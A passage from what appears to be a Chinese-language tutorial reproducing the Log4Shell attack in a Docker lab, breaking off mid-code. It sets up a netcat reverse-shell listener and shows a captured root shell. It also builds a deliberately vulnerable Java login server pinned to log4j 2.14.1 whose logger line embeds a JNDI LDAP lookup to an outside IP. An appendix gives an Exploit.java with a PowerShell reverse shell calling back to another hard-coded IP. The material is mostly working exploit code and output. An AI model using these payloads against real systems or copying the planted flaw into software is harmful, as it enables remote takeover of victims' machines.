<div class="language-txt codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#F8F8F2;--prism-background-color:#282A36><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-txt codeBlock_bY9V thin-scrollbar" style=color:#F8F8F2;background-color:#282A36><code class=codeBlockLines_e6Vv><span class=token-line style=color:#F8F8F2><span class="token plain">-------- New Request --------</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">Time: 2024-09-09T14:33:26.037407574</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">Remote Address: /140.112.107.38:55906</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">Method: GET</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">Path: /Exploit.class</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">-----------------------------</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">File sent successfully.</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">Request handled.</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id=reverse-shell-主機架設>Reverse Shell 主機架設<a href=#reverse-shell-主機架設 class=hash-link aria-label="Reverse Shell 主機架設的直接連結" title="Reverse Shell 主機架設的直接連結">​</a></h2>
<p>最後這個主機的功能就是用來接收 reverse shell，首先需要安裝 netcat :</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#F8F8F2;--prism-background-color:#282A36><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style=color:#F8F8F2;background-color:#282A36><code class=codeBlockLines_e6Vv><span class=token-line style=color:#F8F8F2><span class="token plain">sudo apt-get install netcat-openbsd</span><br></span></code></pre></div></div>
<p>接著監聽 8000 port :</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#F8F8F2;--prism-background-color:#282A36><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style=color:#F8F8F2;background-color:#282A36><code class=codeBlockLines_e6Vv><span class=token-line style=color:#F8F8F2><span class="token plain">nc -vnlp 8000</span><br></span></code></pre></div></div>
<p>啟動後會出現以下訊息 :</p>
<div class="language-txt codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#F8F8F2;--prism-background-color:#282A36><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-txt codeBlock_bY9V thin-scrollbar" style=color:#F8F8F2;background-color:#282A36><code class=codeBlockLines_e6Vv><span class=token-line style=color:#F8F8F2><span class="token plain">Listening on 0.0.0.0 8000</span><br></span></code></pre></div></div>
<p>如果成功監聽會出現以下訊息 :</p>
<div class="language-txt codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#F8F8F2;--prism-background-color:#282A36><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-txt codeBlock_bY9V thin-scrollbar" style=color:#F8F8F2;background-color:#282A36><code class=codeBlockLines_e6Vv><span class=token-line style=color:#F8F8F2><span class="token plain">Connection received on 140.112.107.38 55907</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">bash: cannot set terminal process group (1): Not a tty</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">bash: no job control in this shell</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">bash-4.4#</span><br></span></code></pre></div></div>
<p>看到訊息後就表示我們成功進入含有漏洞的 docker 容器中，我們可以直接執行指令。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id=受害者主機架設>受害者主機架設<a href=#受害者主機架設 class=hash-link aria-label=受害者主機架設的直接連結 title=受害者主機架設的直接連結>​</a></h2>
<p>在受害者的電腦中，首先需要建立一個 java 的 http server 來接收使用者打的 api，
接著使用 docker 來構建一個含有漏洞的 log4j 環境。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#F8F8F2;--prism-background-color:#282A36><div class=codeBlockTitle_OeMC>VulnerableApp.java</div><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-java codeBlock_bY9V thin-scrollbar" style=color:#F8F8F2;background-color:#282A36><code class="codeBlockLines_e6Vv codeBlockLinesWithNumbering_o6Pm" style="counter-reset:line-count 0"><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">import org.apache.logging.log4j.LogManager;</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">import org.apache.logging.log4j.Logger;</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">import com.sun.net.httpserver.HttpExchange;</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">import com.sun.net.httpserver.HttpHandler;</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">import com.sun.net.httpserver.HttpServer;</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain" style=display:inline-block></span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">import java.io.ByteArrayOutputStream;</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">import java.io.IOException;</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">import java.io.InputStream;</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">import java.io.OutputStream;</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">import java.net.InetSocketAddress;</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">import java.nio.charset.StandardCharsets;</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">import java.util.concurrent.Executors;</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain" style=display:inline-block></span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">public class VulnerableApp {</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">    private static final Logger logger = LogManager.getLogger(VulnerableApp.class);</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain" style=display:inline-block></span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">    public static void main(String[] args) throws IOException {</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain" style=display:inline-block></span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        HttpServer server = HttpServer.create(new InetSocketAddress(8080), 0);</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        server.createContext("/login", new LoginHandler());</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        server.setExecutor(Executors.newFixedThreadPool(10));</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        server.start();</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain" style=display:inline-block></span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        System.out.println("Server started on port 8080");</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">    }</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain" style=display:inline-block></span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">    static class LoginHandler implements HttpHandler {</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        @Override</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        public void handle(HttpExchange exchange) throws IOException {</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            if ("POST".equals(exchange.getRequestMethod())) {</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                String requestBody = readRequestBody(exchange.getRequestBody());</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                String[] params = requestBody.split("&");</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                String username = "";</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                String password = "";</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                for (String param : params) {</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                    String[] keyValue = param.split("=");</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                    if (keyValue.length == 2) {</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                        if ("username".equals(keyValue[0])) {</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                            username = keyValue[1];</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                        } else if ("password".equals(keyValue[0])) {</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                            password = keyValue[1];</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                        }</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                    }</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                }</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain" style=display:inline-block></span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                boolean loginSuccess = login(username, password);</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                String response = loginSuccess ? "Login Successful!" : "Login Failed!";</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain" style=display:inline-block></span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                exchange.sendResponseHeaders(200, response.length());</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                try (OutputStream os = exchange.getResponseBody()) {</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                    os.write(response.getBytes());</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                }</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            } else {</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                String response = "Method Not Allowed";</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                exchange.sendResponseHeaders(405, response.length());</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                try (OutputStream os = exchange.getResponseBody()) {</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                    os.write(response.getBytes());</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                }</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            }</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        }</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain" style=display:inline-block></span></span><br></span><span class="token-line theme-code-block-highlighted-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        private boolean login(String username, String password) {</span></span><br></span><span class="token-line theme-code-block-highlighted-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            logger.error("Login attempt: ${jndi:ldap://35.229.194.59:1389/Exploit}" + username);</span></span><br></span><span class="token-line theme-code-block-highlighted-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            return "admin".equals(username) && "password".equals(password);</span></span><br></span><span class="token-line theme-code-block-highlighted-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        }</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain" style=display:inline-block></span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        private String readRequestBody(InputStream is) throws IOException {</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            ByteArrayOutputStream buffer = new ByteArrayOutputStream();</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            byte[] data = new byte[1024];</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            int bytesRead;</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            while ((bytesRead = is.read(data, 0, data.length)) != -1) {</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                buffer.write(data, 0, bytesRead);</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            }</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            return new String(buffer.toByteArray(), StandardCharsets.UTF_8);</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        }</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">    }</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">}</span></span><br></span></code></pre></div></div>
<div class="language-dockerfile codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#F8F8F2;--prism-background-color:#282A36><div class=codeBlockTitle_OeMC>Dockerfile</div><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-dockerfile codeBlock_bY9V thin-scrollbar" style=color:#F8F8F2;background-color:#282A36><code class=codeBlockLines_e6Vv><span class=token-line style=color:#F8F8F2><span class="token plain">FROM openjdk:8-jdk-alpine</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">WORKDIR /app</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">RUN apk add --no-cache wget curl</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">RUN wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">RUN wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">COPY VulnerableApp.java /app</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">RUN javac -cp /app/log4j-core-2.14.1.jar:/app/log4j-api-2.14.1.jar VulnerableApp.java</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">EXPOSE 8080</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">CMD ["java", "-cp", ".:/app/log4j-core-2.14.1.jar:/app/log4j-api-2.14.1.jar", "VulnerableApp"]</span><br></span></code></pre></div></div>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#F8F8F2;--prism-background-color:#282A36><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style=color:#F8F8F2;background-color:#282A36><code class=codeBlockLines_e6Vv><span class=token-line style=color:#F8F8F2><span class="token plain">docker build -t vulnerable-app .</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">docker run -p 8080:8080 vulnerable-app</span><br></span></code></pre></div></div>
<p>由於我們前面要求回傳的 shell 是 bash，但在這個 container 中並沒有 bash，因此我們需要在 container 中安裝 bash :</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#F8F8F2;--prism-background-color:#282A36><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style=color:#F8F8F2;background-color:#282A36><code class=codeBlockLines_e6Vv><span class=token-line style=color:#F8F8F2><span class="token plain">apk add --no-cache bash</span><br></span></code></pre></div></div>
<p>接著輸入 <code>which bash</code> 來確認是否安裝成功。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id=測試>測試<a href=#測試 class=hash-link aria-label=測試的直接連結 title=測試的直接連結>​</a></h2>
<p>我們可以在 powershell 中使用 wget 來測試是否成功 :</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#F8F8F2;--prism-background-color:#282A36><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style=color:#F8F8F2;background-color:#282A36><code class=codeBlockLines_e6Vv><span class=token-line style=color:#F8F8F2><span class="token plain">wget -Method Post -Uri http://localhost:8080/login -Body "username=admin&password=password"</span><br></span></code></pre></div></div>
<p>應該可以看到以下成功訊息 :</p>
<div class="language-txt codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#F8F8F2;--prism-background-color:#282A36><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-txt codeBlock_bY9V thin-scrollbar" style=color:#F8F8F2;background-color:#282A36><code class=codeBlockLines_e6Vv><span class=token-line style=color:#F8F8F2><span class="token plain">StatusCode        : 200</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">StatusDescription : OK</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">Content           : {76, 111, 103, 105...}</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">RawContent        : HTTP/1.1 200 OK</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                    Content-Length: 17</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                    Date: Mon, 09 Sep 2024 14:33:25 GMT</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">                    Login Successful!</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">Headers           : {[Content-Length, 17], [Date, Mon, 09 Sep 2024 14:33:25 GMT]}</span><br></span><span class=token-line style=color:#F8F8F2><span class="token plain">RawContentLength  : 17</span><br></span></code></pre></div></div>
<p>接著我們應該也可以在 reverse shell 中看到 bash 成功跳出，代表這次的攻擊成功。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id=appendix-1--將-docker-改成-windows-環境>Appendix 1 : 將 Docker 改成 Windows 環境<a href=#appendix-1--將-docker-改成-windows-環境 class=hash-link aria-label="Appendix 1 : 將 Docker 改成 Windows 環境的直接連結" title="Appendix 1 : 將 Docker 改成 Windows 環境的直接連結">​</a></h2>
<p>前面的 <code>Exploit.java</code> 使用 bash 的原因是因為我們的受害者電腦是在 docker 環境下，如果我們的目標電腦是 Windows 的話，我們可以改為使用 powershell :</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#F8F8F2;--prism-background-color:#282A36><div class=codeBlockTitle_OeMC>Exploit.java</div><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-java codeBlock_bY9V thin-scrollbar" style=color:#F8F8F2;background-color:#282A36><code class="codeBlockLines_e6Vv codeBlockLinesWithNumbering_o6Pm" style="counter-reset:line-count 0"><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">import java.io.IOException;</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain" style=display:inline-block></span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">public class Exploit {</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">    static {</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">        try {</span></span><br></span><span class="token-line theme-code-block-highlighted-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            String host = "104.199.254.153";</span></span><br></span><span class="token-line theme-code-block-highlighted-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            int port = 8000;</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            String payload = String.format(</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                "$client = New-Object System.Net.Sockets.TCPClient('%s',%d);" +</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                "$stream = $client.GetStream();" +</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                "$writer = New-Object System.IO.StreamWriter($stream);" +</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                "$reader = New-Object System.IO.StreamReader($stream);" +</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                "$writer.AutoFlush = $true;" +</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                "while($true) {" +</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                    "$command = $reader.ReadLine();" +</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                    "if ($command -eq 'exit') { break }" +</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                    "$output = try { Invoke-Expression $command 2>&1 | Out-String } catch { $_.Exception.Message }" +</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                    "$writer.WriteLine($output)" +</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                "}" +</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                "$client.Close()",</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                host, port</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            );</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain" style=display:inline-block></span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">            String[] command = {</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                "powershell.exe",</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                "-NoProfile",</span></span><br></span><span class="token-line codeLine_lJS_" style=color:#F8F8F2><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">                